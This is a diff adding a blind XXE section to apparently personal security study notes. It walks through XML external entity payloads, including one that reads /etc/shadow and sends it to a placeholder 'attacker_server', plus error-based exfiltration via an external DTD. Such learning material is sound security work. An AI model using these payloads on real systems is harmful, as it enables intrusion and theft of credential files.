@@ -104,6 +104,36 @@ You can use XXEs to:
     Example 2: (returns AWS metadata)</br>
     ![image](https://github.com/user-attachments/assets/42b1337e-94a9-4c91-8dfd-c4f2530898c1)</br>
 3. Lauanch DoS attacks
+4. Use blind XXE
+    1. First thought of blind XXE payload is
+       ```
+       <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE example [
+        <!ENTITY file SYSTEM "file:///etc/shadow">
+        <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">
+        ]>
+        <example>&exfiltrate;</example>
+       ```
+       This payload won't work, WHY? because most parsers do not allow referencing of external entities inside another external entities. So the parser will stop processing the payload once it reaches this line ` <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file">`. </br>
+       **SOLUTION**: Use `parameter entities` instead;</br>
+       `parameter entities` are XML entities that can be referenced else where in the DTD.</br>
+   2. Second thought: </br>
+       ![image](https://github.com/user-attachments/assets/54a76082-f5d5-4d0d-9300-95eda71ca6da)</br>
+       This payload won't work as well, WHY? because parameter entities are treated differently in inline DTDs (DTDs within the XML document inside `<!DOCTYPE>` tag ) and external DTDs (separate DTD hosted elsewhere).</br>
+       In inline DTDs, parameter entities cannot be reference inside markups (angle brackets <>), which means the parser will stop processing the DTD once it reaches this line `<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">`. But in external DTDs, there is no such restriction.</br>
+      **SOLUTOIN:** Host external DTD on your server, then reference it in a parameter entity.</br>
+   3. Third thought:</br>
+      Host external DTD on your server and save it in a file let's say xxe.dtd
+      ![image](https://github.com/user-attachments/assets/28f55bac-8851-4842-af2e-b409d390a1a8)</br>
+       Then specify it within a parameter entity and reference it.</br>
+       ![image](https://github.com/user-attachments/assets/ce6344a9-b2a3-490c-bc92-5df0b8bed53b)
+       Notice, this payload will exfiltrate only one line from the file as the (/n) will break the outbound connection, so to read all the lines, you can force the parser to trigger an error by reading a non-existent file</br>
+       ![image](https://github.com/user-attachments/assets/0822231a-b111-47a1-b450-b95bc9cd3bb4)</br>
+       Then you sumbit the same payload to the target to trigger the attack</br>
+       ![image](https://github.com/user-attachments/assets/148677ba-cf6f-4cff-9c32-0604d62da746)</br>
+       This malicious DTD will cause the parser to deliver the desired file contents as a File Not Found error:`java.io.FileNotFoundException: file:///nonexistent/FILE CONTENTS OF /etc/shadow`.
+
+
 >[!Note]
 >When trying to exfiltrate unintended data, check the page source or the http repsonse directly rather than the HTML page rendered by the browser as it might not be rendered correctly.</br>
 
